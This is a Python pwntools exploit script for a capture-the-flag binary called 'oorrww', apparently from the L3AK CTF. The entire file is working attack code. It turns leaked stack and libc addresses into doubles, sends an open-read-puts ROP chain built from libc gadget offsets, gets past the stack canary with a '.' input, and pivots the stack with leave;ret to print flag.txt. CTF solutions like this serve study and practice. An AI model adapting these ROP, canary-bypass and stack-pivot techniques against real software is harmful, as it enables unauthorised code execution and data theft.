#!/usr/bin/python3
from pwn import process, p64, u64, struct, log

shell = process("./oorrww")

shell.recvuntil(b"you: ")
leak = shell.recvline()[:-2].split(b" ")

stack_base = u64(struct.pack("d", float(leak[0].decode())))
libc_base = u64(struct.pack("d", float(leak[1].decode()))) - 0x62090

def rop(addr):
    double = struct.unpack("d", p64(addr))[0]
    shell.sendlineafter(b":\n", str(double).encode())

rop(0x7478742e67616c66)   # "flag.txt"
rop(0x0)                  # "\x00"
rop(libc_base + 0x2a3e5)  # pop rdi; ret;
rop(stack_base)           # &"flag.txt"
rop(libc_base + 0x2be51)  # pop rsi; ret;
rop(0x0)                  # flags
rop(libc_base + 0xd8380)  # mov rax, 2; ret;
rop(libc_base + 0x91316)  # syscall; ret;
rop(libc_base + 0x2a3e5)  # pop rdi; ret;
rop(0x3)                  # descriptor
rop(libc_base + 0x2be51)  # pop rsi; ret;
rop(libc_base + 0x21a1e0) # .data
rop(libc_base + 0x904a9)  # pop rdx; pop rbx; ret;
rop(0x40)                 # len
rop(0x0)                  # padding for pop
rop(libc_base + 0x1147d0) # read()
rop(libc_base + 0x2a3e5)  # pop rdi; ret;
rop(libc_base + 0x21a1e0) # .data
rop(libc_base + 0x80e50)  # puts()

shell.sendlineafter(b":\n", b".") # canary

rop(stack_base + 8)      # pivot addr
rop(libc_base + 0x4da83) # leave; ret;

flag = shell.recvline_contains(b"L3AK")
log.info(f"Flag: {flag.decode()}")
